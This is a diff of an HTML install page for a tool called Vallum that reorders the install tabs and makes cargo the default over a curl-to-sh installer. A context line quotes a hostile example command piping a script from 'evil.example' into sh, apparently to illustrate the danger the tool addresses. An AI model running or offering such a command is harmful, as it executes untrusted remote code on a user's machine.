@@ -252,27 +252,27 @@ to run `curl -s https://evil.example/i.sh | sh`</span>
 
     <div class="plinth">
       <div class="method-switch" role="tablist" aria-label="Install methods">
-        <button id="tab-shell" class="method active" role="tab" aria-selected="true" aria-controls="panel-shell" data-method="shell">shell</button>
-        <button id="tab-brew" class="method" role="tab" aria-selected="false" aria-controls="panel-brew" data-method="brew">brew</button>
-        <button id="tab-cargo" class="method" role="tab" aria-selected="false" aria-controls="panel-cargo" data-method="cargo">cargo</button>
+        <button id="tab-cargo" class="method active" role="tab" aria-selected="true" aria-controls="panel-cargo" data-method="cargo">cargo</button>
         <button id="tab-npm" class="method" role="tab" aria-selected="false" aria-controls="panel-npm" data-method="npm">npm</button>
+        <button id="tab-brew" class="method" role="tab" aria-selected="false" aria-controls="panel-brew" data-method="brew">brew</button>
+        <button id="tab-shell" class="method" role="tab" aria-selected="false" aria-controls="panel-shell" data-method="shell">shell</button>
       </div>
       <div class="plinth-cmds">
-        <div id="panel-shell" class="plinth-cmd active" data-method-panel="shell" role="tabpanel" aria-labelledby="tab-shell">
-          <pre><code>curl --proto '=https' --tlsv1.2 -LsSf https://github.com/kahramanemir/Vallum/releases/latest/download/vallum-installer.sh | sh</code></pre>
-          <button class="copy-btn" data-copy="curl --proto '=https' --tlsv1.2 -LsSf https://github.com/kahramanemir/Vallum/releases/latest/download/vallum-installer.sh | sh">Copy</button>
-        </div>
-        <div id="panel-brew" class="plinth-cmd" data-method-panel="brew" role="tabpanel" aria-labelledby="tab-brew" hidden>
-          <pre><code>brew install kahramanemir/homebrew-tap/vallum</code></pre>
-          <button class="copy-btn" data-copy="brew install kahramanemir/homebrew-tap/vallum">Copy</button>
-        </div>
-        <div id="panel-cargo" class="plinth-cmd" data-method-panel="cargo" role="tabpanel" aria-labelledby="tab-cargo" hidden>
+        <div id="panel-cargo" class="plinth-cmd active" data-method-panel="cargo" role="tabpanel" aria-labelledby="tab-cargo">
           <pre><code>cargo install vallum</code></pre>
           <button class="copy-btn" data-copy="cargo install vallum">Copy</button>
         </div>
         <div id="panel-npm" class="plinth-cmd" data-method-panel="npm" role="tabpanel" aria-labelledby="tab-npm" hidden>
           <pre><code>npm install -g vallum</code></pre>
           <button class="copy-btn" data-copy="npm install -g vallum">Copy</button>
+        </div>
+        <div id="panel-brew" class="plinth-cmd" data-method-panel="brew" role="tabpanel" aria-labelledby="tab-brew" hidden>
+          <pre><code>brew install kahramanemir/homebrew-tap/vallum</code></pre>
+          <button class="copy-btn" data-copy="brew install kahramanemir/homebrew-tap/vallum">Copy</button>
+        </div>
+        <div id="panel-shell" class="plinth-cmd" data-method-panel="shell" role="tabpanel" aria-labelledby="tab-shell" hidden>
+          <pre><code>curl --proto '=https' --tlsv1.2 -LsSf https://github.com/kahramanemir/Vallum/releases/latest/download/vallum-installer.sh | sh</code></pre>
+          <button class="copy-btn" data-copy="curl --proto '=https' --tlsv1.2 -LsSf https://github.com/kahramanemir/Vallum/releases/latest/download/vallum-installer.sh | sh">Copy</button>
         </div>
       </div>
     </div>
